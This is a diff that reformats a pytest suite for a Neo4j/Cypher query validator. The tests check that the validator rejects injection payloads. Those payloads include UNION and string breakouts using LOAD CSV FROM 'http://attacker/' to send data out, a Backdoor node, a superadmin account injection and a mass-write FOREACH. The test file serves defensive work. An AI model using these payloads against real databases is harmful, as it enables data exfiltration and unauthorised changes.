@@ -1,8 +1,6 @@
-from unittest.mock import AsyncMock
-from unittest.mock import MagicMock
+from unittest.mock import AsyncMock, MagicMock
 
-from reporting.services.query_validator import validate_query
-from reporting.services.query_validator import ValidationResult
+from reporting.services.query_validator import ValidationResult, validate_query
 
 
 def _mock_cyver(
@@ -29,19 +27,13 @@ def _mock_cyver(
         mock_summary.notifications = syntax_notifications or []
         mock_summary.query_type = query_type
         mock_driver.execute_query = AsyncMock(return_value=([], mock_summary, []))
-    mocker.patch(
-        "reporting.services.query_validator._get_async_neo4j_client"
-    ).return_value = mock_driver
+    mocker.patch("reporting.services.query_validator._get_async_neo4j_client").return_value = mock_driver
 
-    mocker.patch(
-        "reporting.services.query_validator.SchemaValidator"
-    ).return_value.validate.return_value = (
+    mocker.patch("reporting.services.query_validator.SchemaValidator").return_value.validate.return_value = (
         schema_ok,
         schema_meta if schema_meta is not None else [],
     )
-    mocker.patch(
-        "reporting.services.query_validator.PropertiesValidator"
-    ).return_value.validate.return_value = (
+    mocker.patch("reporting.services.query_validator.PropertiesValidator").return_value.validate.return_value = (
         props_ok,
         props_meta if props_meta is not None else [],
     )
@@ -99,12 +91,8 @@ async def test_validate_query_syntax_error_stops_further_validation(mocker):
             }
         ],
     )
-    schema_mock = mocker.patch(
-        "reporting.services.query_validator.SchemaValidator"
-    ).return_value
-    props_mock = mocker.patch(
-        "reporting.services.query_validator.PropertiesValidator"
-    ).return_value
+    schema_mock = mocker.patch("reporting.services.query_validator.SchemaValidator").return_value
+    props_mock = mocker.patch("reporting.services.query_validator.PropertiesValidator").return_value
 
     await validate_query("MATC (n) RETURN n")
 
@@ -134,9 +122,7 @@ async def test_validate_query_parameterized_query_without_params_is_warning(mock
             }
         ],
     )
-    result = await validate_query(
-        "MATCH (c:CVE) WHERE c.base_severity = $base_severity RETURN count(c)"
-    )
+    result = await validate_query("MATCH (c:CVE) WHERE c.base_severity = $base_severity RETURN count(c)")
     assert not result.has_errors
     assert len(result.warnings) == 1
     assert "Missing parameters" in result.warnings[0]
@@ -166,9 +152,7 @@ async def test_validate_query_properties_issue_is_warning(mocker):
     _mock_cyver(
         mocker,
         props_ok=False,
-        props_meta=[
-            {"code": "PropertiesError", "description": "Unknown property: bar"}
-        ],
+        props_meta=[{"code": "PropertiesError", "description": "Unknown property: bar"}],
     )
     result = await validate_query("MATCH (n) WHERE n.bar = 1 RETURN n")
     assert not result.has_errors
@@ -182,9 +166,7 @@ async def test_validate_query_multiple_warnings(mocker):
         schema_ok=False,
         schema_meta=[{"code": "SchemaError", "description": "Unknown label: Foo"}],
         props_ok=False,
-        props_meta=[
-            {"code": "PropertiesError", "description": "Unknown property: bar"}
-        ],
+        props_meta=[{"code": "PropertiesError", "description": "Unknown property: bar"}],
     )
     result = await validate_query("MATCH (n:Foo) WHERE n.bar = 1 RETURN n")
     assert not result.has_errors
@@ -195,9 +177,7 @@ async def test_validate_query_errors_and_warnings_independent(mocker):
     """Syntax error short-circuits; schema/property warnings are never added."""
     _mock_cyver(
         mocker,
-        syntax_notifications=[
-            {"code": "Neo.ClientError.Statement.SyntaxError", "description": "bad"}
-        ],
+        syntax_notifications=[{"code": "Neo.ClientError.Statement.SyntaxError", "description": "bad"}],
         schema_ok=False,
         schema_meta=[{"code": "SchemaError", "description": "Unknown label"}],
     )
@@ -274,16 +254,13 @@ class TestNeo4jectionStringInjection:
     async def test_or_true_with_clause_breakout(self, mocker):
         _mock_cyver(mocker)
         result = await validate_query(
-            "' OR 1=1 WITH 0 as _l00 CALL db.labels() yield label "
-            "LOAD CSV FROM 'http://attacker/' as l RETURN 1 //"
+            "' OR 1=1 WITH 0 as _l00 CALL db.labels() yield label LOAD CSV FROM 'http://attacker/' as l RETURN 1 //"
         )
         assert result.has_errors
 
     async def test_property_filter_breakout(self, mocker):
         _mock_cyver(mocker)
-        result = await validate_query(
-            "'=' LOAD CSV FROM 'http://attacker/' as l " "WITH 0 as _l00 RETURN 1 //"
-        )
+        result = await validate_query("'=' LOAD CSV FROM 'http://attacker/' as l WITH 0 as _l00 RETURN 1 //")
         assert result.has_errors
 
 
@@ -292,25 +269,18 @@ class TestNeo4jectionUnionInjection:
 
     async def test_node_property_union_breakout(self, mocker):
         _mock_cyver(mocker)
-        result = await validate_query(
-            "'}) RETURN 1 UNION MATCH (n) "
-            "LOAD CSV FROM 'http://attacker/' as l RETURN 1 //"
-        )
+        result = await validate_query("'}) RETURN 1 UNION MATCH (n) LOAD CSV FROM 'http://attacker/' as l RETURN 1 //")
         assert result.has_errors
 
     async def test_label_union_breakout(self, mocker):
         _mock_cyver(mocker)
-        result = await validate_query(
-            "a) RETURN 1 UNION MATCH (n) "
-            "LOAD CSV FROM 'http://attacker/' as l RETURN 1 //"
-        )
+        result = await validate_query("a) RETURN 1 UNION MATCH (n) LOAD CSV FROM 'http://attacker/' as l RETURN 1 //")
         assert result.has_errors
 
     async def test_relationship_union_breakout(self, mocker):
         _mock_cyver(mocker)
         result = await validate_query(
-            "'}]-() RETURN 1 UNION MATCH (n) "
-            "LOAD CSV FROM 'http://attacker/' as l RETURN 1 //"
+            "'}]-() RETURN 1 UNION MATCH (n) LOAD CSV FROM 'http://attacker/' as l RETURN 1 //"
         )
         assert result.has_errors
 
@@ -346,9 +316,7 @@ class TestNeo4jectionDataExfiltration:
 
     async def test_load_csv_standalone(self, mocker):
         _mock_cyver(mocker)
-        result = await validate_query(
-            "LOAD CSV FROM 'http://attacker/data' AS row RETURN row"
-        )
+        result = await validate_query("LOAD CSV FROM 'http://attacker/data' AS row RETURN row")
         assert result.has_errors
 
 
@@ -427,17 +395,12 @@ class TestNeo4jectionWriteClauses:
 
     async def test_create_node_injection(self, mocker):
         _mock_cyver(mocker, query_type="rw")
-        result = await validate_query(
-            "MATCH (n) RETURN n UNION CREATE (evil:Backdoor {cmd: 'whoami'})"
-        )
+        result = await validate_query("MATCH (n) RETURN n UNION CREATE (evil:Backdoor {cmd: 'whoami'})")
         assert result.has_errors
 
     async def test_merge_with_on_create(self, mocker):
         _mock_cyver(mocker, query_type="rw")
-        result = await validate_query(
-            "MERGE (n:Admin {name: 'attacker'}) "
-            "ON CREATE SET n.role = 'superadmin' RETURN n"
-        )
+        result = await validate_query("MERGE (n:Admin {name: 'attacker'}) ON CREATE SET n.role = 'superadmin' RETURN n")
         assert result.has_errors
 
     async def test_detach_delete_all(self, mocker):
@@ -447,10 +410,7 @@ class TestNeo4jectionWriteClauses:
 
     async def test_foreach_write(self, mocker):
         _mock_cyver(mocker, query_type="rw")
-        result = await validate_query(
-            "MATCH (n) WITH collect(n) as nodes "
-            "FOREACH (x IN nodes | SET x.pwned = true)"
-        )
+        result = await validate_query("MATCH (n) WITH collect(n) as nodes FOREACH (x IN nodes | SET x.pwned = true)")
         assert result.has_errors
 
     async def test_remove_labels(self, mocker):
